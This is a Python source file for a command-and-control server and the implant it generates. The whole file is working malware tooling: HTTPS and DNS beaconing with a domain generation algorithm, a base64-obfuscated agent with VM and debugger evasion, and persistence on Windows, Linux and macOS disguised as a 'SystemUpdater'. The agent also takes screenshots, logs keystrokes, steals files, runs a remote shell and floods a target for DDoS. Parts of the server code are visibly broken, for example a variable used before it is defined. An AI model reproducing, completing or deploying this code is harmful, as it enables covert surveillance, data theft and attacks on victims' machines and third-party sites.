import http.server
import ssl
import threading
import socketserver
import json
import base64
import os
import hmac
import hashlib
from cryptography.fernet import Fernet
from datetime import datetime
import dnslib
from socket import socket, AF_INET, SOCK_DGRAM
import platform
import subprocess
import random
import time
import psutil

# Configuration
C2_PORT = 8443
DNS_PORT = 53
CERT_FILE = "server.crt"
KEY_FILE = "server.key"
TASKS_DIR = "tasks"
FILES_DIR = "files"
SECRET_KEY = os.urandom(32)
C2_DOMAIN = "c2.example.com"

# Store active listeners, agents, and their keys
listeners = {}
agents = {}  # {agent_id: {"status": str, "tasks": list, "key": bytes}}

def generate_domain(seed):
    """Domain Generation Algorithm (DGA)"""
    return hashlib.md5((seed + str(int(datetime.now().timestamp() // 86400))).encode()).hexdigest()[:10] + "." + C2_DOMAIN

class C2Handler(http.server.BaseHTTPRequestHandler):
    def verify_hmac(self, data, received_hmac):
        computed_hmac = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
        return hmac.compare_digest(computed_hmac, base64.b64decode(received_hmac))

    def do_GET(self):
        if self.path.startswith("/files/"):
            file_name = self.path.split("/")[-1]
            file_path = os.path.join(FILES_DIR, file_name)
            if os.path.exists(file_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"C2 Server")

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.wfile.read(content_length)
        hmac_header = self.headers.get("X-HMAC", "")
        if not self.verify_hmac(post_data, hmac_header):
            self.send_response(403)
            self.end_headers()
            return

        data = json.loads(Fernet(agents.get(data.get("agent_id", ""), {}).get("key", SECRET_KEY)).decrypt(post_data).decode())
        agent_id = data["agent_id"]

        if self.path == "/register":
            agent_key = Fernet.generate_key()
            agents[agent_id] = {"status": "active", "tasks": [], "key": agent_key}
            cipher = Fernet(agent_key)
            self.send_response(200)
            self.end_headers()
            response = {"message": "Agent registered", "key": base64.b64encode(agent_key).decode()}
            encrypted_response = cipher.encrypt(json.dumps(response).encode())
            response_hmac = hmac.new(SECRET_KEY, encrypted_response, hashlib.sha256).digest()
            self.send_header("X-HMAC", base64.b64encode(response_hmac).decode())
            self.end_headers()
            self.wfile.write(encrypted_response)

        elif self.path == "/task":
            if agent_id in agents:
                cipher = Fernet(agents[agent_id]["key"])
                task = agents[agent_id]["tasks"].pop(0) if agents[agent_id]["tasks"] else None
                self.send_response(200)
                self.end_headers()
                response = {"task": task}
                encrypted_response = cipher.encrypt(json.dumps(response).encode())
                response_hmac = hmac.new(SECRET_KEY, encrypted_response, hashlib.sha256).digest()
                self.send_header("X-HMAC", base64.b64encode(response_hmac).decode())
                self.end_headers()
                self.wfile.write(encrypted_response)
            else:
                self.send_response(404)
                self.end_headers()

        elif self.path == "/result" or self.path == "/upload":
            if agent_id in agents:
                cipher = Fernet(agents[agent_id]["key"])
                if self.path == "/result":
                    result = data["result"]
                    with open(os.path.join(TASKS_DIR, f"{agent_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), "w") as f:
                        f.write(result)
                    print(f"Result from {agent_id}: {result}")
                else:
                    file_data = base64.b64decode(data["file_data"])
                    file_name = data["file_name"]
                    with open(os.path.join(FILES_DIR, f"{agent_id}_{file_name}"), "wb") as f:
                        f.write(file_data)
                    print(f"File uploaded from {agent_id}: {file_name}")
                self.send_response(200)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()

def start_dns_listener():
    sock = socket(AF_INET, SOCK_DGRAM)
    sock.bind(("", DNS_PORT))
    print(f"DNS listener started on port {DNS_PORT}")
    while True:
        data, addr = sock.recvfrom(1024)
        request = dnslib.DNSRecord.parse(data)
        domain = str(request.q.qname)
        current_domain = generate_domain("c2seed")
        if domain.startswith(f"task.") and current_domain in domain:
            agent_id = domain.split(".")[1]
            if agent_id in agents:
                cipher = Fernet(agents[agent_id]["key"])
                task = agents[agent_id]["tasks"].pop(0) if agents[agent_id]["tasks"] else None
                response_data = cipher.encrypt(json.dumps({"task": task}).encode())
                response = request.reply()
                response.add_answer(dnslib.RR(domain, dnslib.QTYPE.TXT, rdata=dnslib.TXT(base64.b64encode(response_data))))
                sock.sendto(response.pack(), addr)
        elif domain.startswith(f"result.") and current_domain in domain:
            agent_id = domain.split(".")[1]
            if agent_id in agents:
                cipher = Fernet(agents[agent_id]["key"])
                result = cipher.decrypt(base64.b64decode(request.q.qname.label[2])).decode()
                with open(os.path.join(TASKS_DIR, f"{agent_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), "w") as f:
                    f.write(result)
                print(f"DNS Result from {agent_id}: {result}")

def start_listener(port):
    server = http.server.HTTPServer(("", port), C2Handler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    listener_thread = threading.Thread(target=server.serve_forever)
    listener_thread.start()
    listeners[port] = server
    print(f"HTTPS listener started on port {port}")

def stop_listener(port):
    if port in listeners:
        listeners[port].shutdown()
        del listeners[port]
        print(f"Listener stopped on port {port}")

def generate_payload(agent_id, domain=C2_DOMAIN):
    var_c2_url = f"v{os.urandom(4).hex()}"
    var_agent_id = f"a{os.urandom(4).hex()}"
    var_cipher = f"c{os.urandom(4).hex()}"
    payload = f"""
import requests
import json
import base64
import os
import time
import platform
import subprocess
import random
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput import keyboard
import hmac
import hashlib
import ctypes
import dnslib
from socket import socket, AF_INET, SOCK_DGRAM
import psutil

{var_agent_id} = "{agent_id}"
C2_DOMAIN = "{domain}"
SECRET_KEY = {base64.b64encode(SECRET_KEY).decode()!r}
{var_cipher} = None

def compute_hmac(data):
    return base64.b64encode(hmac.new(base64.b64decode(SECRET_KEY), data, hashlib.sha256).digest()).decode()

def is_vm():
    checks = [
        ctypes.windll.kernel32.IsDebuggerPresent() if platform.system() == "Windows" else False,
        os.path.exists("/proc/xen"),
        len(os.popen("wmic bios get serialnumber" if platform.system() == "Windows" else "dmidecode -s system-serial-number").read().strip()) < 5,
        os.path.exists("/Library/Application Support/VMware Tools") if platform.system() == "Darwin" else False
    ]
    return any(checks)

def generate_domain(seed):
    import hashlib
    return hashlib.md5((seed + str(int(time.time() // 86400))).encode()).hexdigest()[:10] + "." + C2_DOMAIN

def register():
    global {var_cipher}
    {var_cipher} = Fernet(Fernet.generate_key())
    data = json.dumps({{"agent_id": {var_agent_id}}}).encode()
    encrypted_data = {var_cipher}.encrypt(data)
    headers = {{"X-HMAC": compute_hmac(encrypted_data)}}
    try:
        response = requests.post(f"https://{{generate_domain('c2seed')}}:{C2_PORT}/register", verify=False, data=encrypted_data, headers=headers)
        response_hmac = response.headers.get("X-HMAC")
        if hmac.compare_digest(hmac.new(base64.b64decode(SECRET_KEY), response.content, hashlib.sha256).digest(), base64.b64decode(response_hmac)):
            data = json.loads({var_cipher}.decrypt(response.content).decode())
            {var_cipher} = Fernet(base64.b64decode(data["key"]))
    except:
        pass

def get_task_dns():
    sock = socket(AF_INET, SOCK_DGRAM)
    request = dnslib.DNSRecord.question(f"task.{{var_agent_id}}.{{generate_domain('c2seed')}}", "TXT")
    sock.sendto(request.pack(), ("127.0.0.1", 53))
    data, _ = sock.recvfrom(1024)
    response = dnslib.DNSRecord.parse(data)
    for answer in response.rr:
        if answer.rtype == dnslib.QTYPE.TXT:
            return json.loads({var_cipher}.decrypt(base64.b64decode(answer.rdata.data)).decode())["task"]
    return None

def send_result_dns(result):
    sock = socket(AF_INET, SOCK_DGRAM)
    encrypted_result = {var_cipher}.encrypt(result.encode())
    request = dnslib.DNSRecord.question(f"result.{{var_agent_id}}.{{base64.b64encode(encrypted_result).decode()}}.{{generate_domain('c2seed')}}", "TXT")
    sock.sendto(request.pack(), ("127.0.0.1", 53))

def get_task():
    try:
        return get_task_dns()
    except:
        return None

def send_result(result):
    try:
        send_result_dns(result)
    except:
        pass

def upload_file(file_path):
    with open(file_path, "rb") as f:
        file_data = base64.b64encode(f.read()).decode()
    data = json.dumps({{"agent_id": {var_agent_id}, "file_name": os.path.basename(file_path), "file_data": file_data}}).encode()
    encrypted_data = {var_cipher}.encrypt(data)
    headers = {{"X-HMAC": compute_hmac(encrypted_data)}}
    requests.post(f"https://{{generate_domain('c2seed')}}:{C2_PORT}/upload", verify=False, data=encrypted_data, headers=headers)

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = f"screenshot_{{int(time.time())}}.png"
    screenshot.save(screenshot_path)
    upload_file(screenshot_path)
    os.remove(screenshot_path)

def keylogger(duration):
    log = []
    def on_press(key):
        log.append(str(key))
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(int(duration))
    listener.stop()
    return "".join(log)

def remote_shell(commands):
    results = []
    for cmd in commands.split(";"):
        results.append(subprocess.getoutput(cmd.strip()))
    return "\\n".join(results)

def system_info():
    info = {
        "os": platform.platform(),
        "cpu": psutil.cpu_count(),
        "memory": psutil.virtual_memory().total / (1024 ** 3),  # GB
        "hostname": platform.node()
    }
    return json.dumps(info)

def persist():
    if platform.system() == "Windows":
        subprocess.run(["schtasks", "/create", "/sc", "onlogon", "/tn", "SystemUpdater", "/tr", f"python {os.path.abspath(__file__)}", "/f"], capture_output=True)
    elif platform.system() == "Linux":
        cron_job = f"* * * * * python3 {os.path.abspath(__file__)}"
        with open("/tmp/cron", "w") as f:
            f.write(cron_job)
        subprocess.run(["crontab", "/tmp/cron"], capture_output=True)
    elif platform.system() == "Darwin":
        plist = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
            '<plist version="1.0">\n'
            '<dict>\n'
            '    <key>Label</key>\n'
            '    <string>com.system.updater</string>\n'
            '    <key>ProgramArguments</key>\n'
            '    <array>\n'
            '        <string>python3</string>\n'
            f'        <string>{os.path.abspath(__file__)}</string>\n'
            '    </array>\n'
            '    <key>RunAtLoad</key>\n'
            '    <true/>\n'
            '</dict>\n'
            '</plist>'
        )
        with open(os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist"), "w") as f:
            f.write(plist)
        subprocess.run(["launchctl", "load", os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist")], capture_output=True)

def main():
    if is_vm():
        time.sleep(3600)
        return
    persist()
    register()
    while True:
        task = get_task()
        if task:
            task_type, task_data = task["type"], task["data"]
            if task_type == "command":
                result = subprocess.getoutput(task_data)
                send_result(result)
            elif task_type == "upload":
                upload_file(task_data)
            elif task_type == "screenshot":
                take_screenshot()
            elif task_type == "keylog":
                result = keylogger(int(task_data))
                send_result(result)
            elif task_type == "ddos":
                import threading
                import requests
                end_time = time.time() + int(task_data["duration"])
                def flood():
                    while time.time() < end_time:
                        try:
                            requests.get(task_data["url"], verify=False)
                        except:
                            pass
                threads = [threading.Thread(target=flood) for _ in range(10)]
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            elif task_type == "shell":
                result = remote_shell(task_data)
                send_result(result)
            elif task_type == "sysinfo":
                result = system_info()
                send_result(result)
        time.sleep(random.randint(30, 120))

if __name__ == "__main__":
    exec(__import__('base64').b64decode('{base64.b64encode('main()'.encode()).decode()}').decode())
"""
    encoded_payload = base64.b64encode(payload.encode()).decode()
    wrapper = f"""
import base64
exec(base64.b64decode('{encoded_payload}').decode())
"""
    with open(f"agent_{agent_id}.py", "w") as f:
        f.write(wrapper)
    print(f"Stealth payload generated: agent_{agent_id}.py")

def task_agent(agent_id, task_type, task_data):
    if agent_id in agents:
        agents[agent_id]["tasks"].append({"type": task_type, "data": task_data})
        print(f"Task '{task_type}:{task_data}' assigned to {agent_id}")
    else:
        print(f"Agent {agent_id} not found")

def broadcast_task(task_type, task_data):
    for agent_id in agents:
        task_agent(agent_id, task_type, task_data)
    print(f"Broadcasted task '{task_type}' to all agents")

# Initialize directories
os.makedirs(TASKS_DIR, exist_ok=True)
os.makedirs(FILES_DIR, exist_ok=True)

# Example usage
if __name__ == "__main__":
    threading.Thread(target=start_dns_listener, daemon=True).start()
    start_listener(C2_PORT)
    generate_payload("agent_001")
    task_agent("agent_001", "command", "whoami")
    task_agent("agent_001", "screenshot", "")
    task_agent("agent_001", "keylog", "10")
    task_agent("agent_001", "upload", "test.txt")
    task_agent("agent_001", "shell", "whoami;dir")
    task_agent("agent_001", "sysinfo", "")
    broadcast_task("ddos", {"url": "http://target.com", "duration": "30"})
